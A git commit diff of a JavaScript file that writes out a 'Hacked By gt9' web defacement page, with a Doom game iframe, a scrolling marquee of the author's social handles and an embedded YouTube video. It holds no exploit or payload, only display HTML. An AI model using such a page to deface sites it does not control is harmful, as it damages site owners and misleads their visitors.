0bdd0e5fde687b44a5d0b4b0366a77ac927de96f
gt9sec <167272959+GT9sec@users.noreply.github.com>
2025-02-02 02:49:43 -0300

    Update index.js

--- index.js
+++ index.js
@@ -1,10 +1,10 @@
 var htmlContent = `
 <!DOCTYPE html>
 <title>Hacked By gt9 </title>
-<link rel="icon" href="" type="image/x-icon"/>
-<link rel="shortcut icon" href="" type="image/x-icon"/>
+<link rel="icon" href="https://media.tenor.com/CzFphlrUGpMAAAAj/doom-slayer.gif" type="image/x-icon"/>
+<link rel="shortcut icon" href="https://media.tenor.com/CzFphlrUGpMAAAAj/doom-slayer.gif" type="image/x-icon"/>
 <meta charset="UTF-8">
-<body style="background-color: black !important; margin: 0; padding: 0;">
+<body bgcolor="black">
   <style type="text/css">/* latin */ @font-face { font-family: 'Iceberg'; font-style: normal; font-weight: 400; src: local('Iceberg'), local('Iceberg-Regular'), url(https://fonts.gstatic.com/s/iceberg/v7/8QIJdijAiM7o-qnZiI8EqprnEO0.woff2) format('woff2'); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }</style> 
   <style type="text/css">/* latin */ @font-face { font-family: 'Wallpoet'; font-style: normal; font-weight: 400; src: local('Wallpoet'), url(https://fonts.gstatic.com/s/wallpoet/v11/f0X10em2_8RnXVVdUObp58Tt868H.woff2) format('woff2'); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }</style>  
   <style>
@@ -31,10 +31,13 @@ var htmlContent = `
     <hr>
     <iframe src="https://emupedia.net/emupedia-game-doom1/" width="1000" height="600" frameborder="0" allowfullscreen></iframe>
     <hr>
-    <marquee style="font-size: 30px; font-weight: bold; color: green; font-family: 'Iceberg'">Um salve para meus manos!: Cyhp3r - Darui - Slash - Slow - zer0 - UprisingHK - 0xysha - Nano - psychoHKtech - archon</marquee>
+    <marquee style="font-size: 30px; font-weight: bold; color: green; font-family: 'Iceberg'">Instagram: @gt9sec Youtube: www.youtube.com/@gt9sec Github: github.com/gt9sec Telegram: t.me/gt9sec</marquee><p><hr>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/3S2DmZI9xZ8?si=ot9kQIY7jihaCo3z" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>  
+  
+  
+  
   </center>
 </body>
 </html>
 `;
-
 document.write(htmlContent);
